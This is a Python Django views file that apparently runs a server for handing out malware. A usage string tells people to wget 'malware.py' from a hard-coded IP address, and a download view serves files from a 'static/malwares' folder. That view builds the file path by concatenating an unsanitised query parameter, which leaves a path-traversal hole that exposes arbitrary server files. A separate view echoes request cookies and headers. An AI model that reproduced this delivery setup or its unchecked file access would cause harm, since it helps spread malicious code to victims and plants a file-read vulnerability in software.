from django.shortcuts import render
from django.http import FileResponse, HttpResponse
import requests
import os, sys, time, logging
from Project_Z.settings import DEBUG
# ======================================

USAGE = '''
       Usage:
            wget http://104.153.98.175/download?f=malware.py

'''
def index(request): 
    
    global USAGE

    context = {'usage': USAGE} if request.GET.get('u') else {}
    return render(request, 'index.html', context)

def download(request):

    global DEBUG

    file = request.GET.get('f')
    print("[DOWNLOAD] From {0}: File: {1}".format(request.META['REMOTE_ADDR'], file))
    f = open('static/malwares/'+file, 'r')
    response = HttpResponse(f)
    if DEBUG: print("[DEBUG] File Writen to FileResponse")
    response['Content-Type']        = 'application/octet-stream'
    response['Content-Disposition'] = 'attachment;filename="{0}"'.format(file)
    f.close() # Exception
    return response

def header(request):
    

    context = {
        'scheme'         : request.scheme,
        'path'           : request.path,
        'method'         : request.method,
        'encoding'       : request.encoding,
        'cookies'        : request.COOKIES,
        'CONTENT_LENGTH' : request.META['CONTENT_LENGTH'],
        'CONTENT_TYPE'   : request.META['CONTENT_TYPE'],
        'HTTP_ACCEPT'    :  request.META['HTTP_ACCEPT'],
        'HTTP_ACCEPT_ENCODING': request.META['HTTP_ACCEPT_ENCODING'],
        'HTTP_ACCEPT_LANGUAGE': request.META['HTTP_ACCEPT_LANGUAGE'],
        'HTTP_HOST'      : request.META['HTTP_HOST'],
        #'HTTP_REFERER'   : request.META['HTTP_REFERER'],
        'HTTP_USER_AGENT': request.META['HTTP_USER_AGENT'],
        'QUERY_STRING'   : request.META['QUERY_STRING'],
        'REMOTE_ADDR'    : request.META['REMOTE_ADDR'],
        #'REMOTE_USER'    : request.META['REMOTE_USER'],
        'REQUEST_METHOD' : request.META['REQUEST_METHOD'],
        'SERVER_NAME'    : request.META['SERVER_NAME'],
        'SERVER_PORT'    : request.META['SERVER_PORT'],
    }
    return render(request, 'App/header.html', context)
